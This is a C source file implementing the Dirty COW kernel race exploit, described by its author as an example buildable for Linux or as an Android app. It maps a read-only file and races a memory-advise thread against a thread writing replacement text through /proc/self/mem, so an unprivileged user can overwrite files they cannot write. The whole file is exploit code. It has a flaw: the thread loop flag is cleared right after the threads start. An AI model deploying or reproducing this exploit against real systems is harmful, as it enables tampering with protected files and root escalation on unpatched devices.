/**
 * @author  Andrew Ruggeri
 * @breif This is an example dirty COW program which can be compile and run for Linux as well as built
 *        into a Android app.
 * @details Body for thread functions
 * @date 2017-12-28
 */

#include "dirtyCOW.h"
#include <stdio.h>
#include <stdlib.h>
#include <pthread.h>
#include <sys/stat.h>
#include <errno.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/mman.h>


static int threadLoop = 1;
void* memoryMap = MAP_FAILED;
off_t fileSize = 0;
off_t fileOffset = 0;


void *adviseThreadFunction(void* adviseStruct) {
    printf("Thread: Memory Advise Running\n");

    while(threadLoop) {
        madvise(memoryMap, fileSize, MADV_DONTNEED);
    }

    printf("Advise Thread - Bye\n");
    return NULL;
}


void *writeThreadFunction(void* text) {
    printf("Thread: Write Running\n");

    const char* replaceText = (char*)text;

    int memFile = 0;
    if( (memFile = open("/proc/self/mem", O_RDWR)) < 0) {
        printf("Failed to open /proc/self/mem\n");
        return NULL;
    }

    // Continually try to write text to memory
    size_t textLength = strlen(replaceText);

    printf("%ld : %s\n", textLength, replaceText);

    while(threadLoop) {
        // seek to where to write
        lseek(memFile, fileOffset, SEEK_SET);

        // Write replacement text
        write(memFile, replaceText, textLength);
    }

    printf("Write Thread - Bye\n");
    return NULL;
}


int dirtyCOWrun(const char* filepath, const char* replaceText, off_t offset) {

    // check filepath pointer validity
    if (filepath == NULL || replaceText == NULL)
        return -1;


    printf("Filepath: %s\n",  filepath);
    printf("Text:     %s\n",  replaceText);
    printf("Offset:   %ld\n", offset);


    // Try to open file, check success
    int file = 0;
    if( (file = open(filepath, O_RDONLY)) < 0 ) {
        return file;
    }


    // Get & check file status
    struct stat fileStatus;
    if(fstat(file, &fileStatus) != 0)
        return -1;


    // check sizes
    fileSize = fileStatus.st_size;
    if(fileStatus.st_size <= 0 ||
       fileStatus.st_size <= strlen(replaceText) + offset) {

        printf("Size problem:\n\tFile Size: %ld\n\tText Size: %ld",
               fileStatus.st_size, strlen(replaceText));
        return -1;
    }


    // map the file into the's proccess memory and get address
    memoryMap = mmap(NULL, (size_t)fileStatus.st_size, PROT_READ,
                           MAP_PRIVATE, file, 0);
    if(memoryMap == MAP_FAILED) {
        printf("Failed to map file to memory\n");
        return -1;
    }

    fileOffset = (off_t )memoryMap + offset;

    // Create a paging advise thread
//    adviseArgs_t adviseArgs = {memoryMap, (size_t)fileStatus.st_size};

    pthread_t adviseThread;
    pthread_create(&adviseThread, NULL, adviseThreadFunction, NULL);
//                   (void*)&adviseArgs);


    // Create a writing thread
    pthread_t writeThread;
    pthread_create(&writeThread, NULL, writeThreadFunction, (void*)replaceText);


    // Close/join the threads
    threadLoop = 0;
    pthread_join(adviseThread, NULL);
    pthread_join(writeThread, NULL);

    return 1;
}
